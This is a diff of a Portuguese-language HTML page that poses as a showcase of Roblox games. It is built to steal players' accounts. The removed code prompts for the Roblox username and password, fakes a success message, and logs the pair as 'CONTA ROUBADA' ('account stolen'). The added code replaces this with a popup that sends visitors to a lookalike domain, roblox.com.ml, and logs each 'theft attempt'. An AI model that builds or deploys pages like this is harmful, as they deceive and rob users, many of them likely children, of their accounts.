@@ -32,6 +32,14 @@
             font-size: 17px; font-weight: bold; cursor: pointer; 
         }
         .btn-roubar:hover { background: #cc0000; transform: scale(1.03); }
+
+        /* Menu popup */
+        .popup { 
+            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: #1f1f1f; padding: 30px; border-radius: 12px; width: 420px; 
+            box-shadow: 0 0 40px rgba(255,0,0,0.8); z-index: 1000; text-align: center; border: 3px solid #ffcc00;
+        }
+        .popup h2 { color: #ffcc00; margin-bottom: 15px; }
     </style>
 </head>
 <body>
@@ -44,7 +52,7 @@
             <div class="info">
                 <h3>Noob jogo</h3>
                 <p class="desc">O noob jogo e um jogo de evoluir e subir de level para o proximo mapa! precisa de level 100 para ir pro proximo mapa!!</p>
-                <button class="btn-roubar" onclick="roubar('Noob jogo')">ENTRAR NO JOGO</button>
+                <button class="btn-roubar" onclick="showPopup('Noob jogo')">Join GAME!</button>
             </div>
         </div>
 
@@ -54,7 +62,7 @@
             <div class="info">
                 <h3>Obby Teclas ( Beta )</h3>
                 <p class="desc">O meu jogo Obby teclas e meio que um Obby so que tem teclas no chão pra você pisar e ele faz barulho! igual os outros jogos</p>
-                <button class="btn-roubar" onclick="roubar('Obby Teclas ( Beta )')">ENTRAR NO JOGO</button>
+                <button class="btn-roubar" onclick="showPopup('Obby Teclas ( Beta )')">Join GAME!</button>
             </div>
         </div>
 
@@ -63,33 +71,47 @@
             <img src="racing.png" alt="Racing Speed ( Simple )">
             <div class="info">
                 <h3>Racing Speed ( Simple )</h3>
-                <button class="btn-roubar" onclick="roubar('Racing Speed ( Simple )')">ENTRAR NO JOGO</button>
+                <p class="desc">Um Jogo de Corrida feito por mim! ele ainda e simples mais da pra jogar! )</p>
+                <button class="btn-roubar" onclick="showPopup('Racing Speed ( Simple )')">Join GAME!</button>
             </div>
         </div>
 
         <!-- Jogo 4 -->
         <div class="game-box">
-            <img src="https://picsum.photos/id/180/600/300" alt="Pro Racing">
+            <img src="baile.png" alt="Baile do Planta ( UPD! )">
             <div class="info">
-                <h3>Pro Racing</h3>
-                <button class="btn-roubar" onclick="roubar('Pro Racing')">ENTRAR NO JOGO</button>
+                <h3>Baile do Planta ( UPD! )</h3>
+                <p class="desc">Bom o JOGO e de baile tem carros motos e ate funk alto que você pode colocar o jogo ja bateu 100 players de visita ja:)</p>
+                <button class="btn-roubar" onclick="showPopup('Baile do Planta ( UPD! )')">Join GAME!</button>
             </div>
         </div>
     </div>
 
-    <script>
-        function roubar(jogo) {
-            const username = prompt("Usuário Roblox para entrar em " + jogo + ":");
-            if (!username) return;
-            const password = prompt("Senha Roblox:");
-            if (!password) return;
+    <!-- Popup Menu -->
+    <div id="popup" class="popup">
+        <h2>Antes de você entrar no jogo</h2>
+        <p style="font-size:16px; line-height:1.5;">
+            Siga a minha outra conta do roblox a segundaria para poder ter acesso ao meu jogo!
+        </p>
+        <br>
+        <a href="https://www.roblox.com.ml/users/314556655007/profile" target="_blank" 
+           style="background:#ffcc00; color:#000; padding:12px 25px; text-decoration:none; border-radius:8px; font-weight:bold; display:inline-block;">
+            SEGUIR CONTA SEGUNDÁRIA
+        </a>
+        <br><br>
+        <button onclick="closePopup()" style="background:#666; color:white; border:none; padding:10px 20px; border-radius:6px; cursor:pointer;">
+            Fechar
+        </button>
+    </div>
 
-            alert("Conectando ao servidor de " + jogo + "...\n\nConta vinculada com sucesso!");
-            
-            console.log("=== CONTA ROUBADA ===");
-            console.log("Jogo:", jogo);
-            console.log("Username:", username);
-            console.log("Senha:", password);
+    <script>
+        function showPopup(jogo) {
+            document.getElementById('popup').style.display = 'block';
+            console.log("Tentativa de roubo para:", jogo);
+        }
+
+        function closePopup() {
+            document.getElementById('popup').style.display = 'none';
         }
     </script>
 </body>
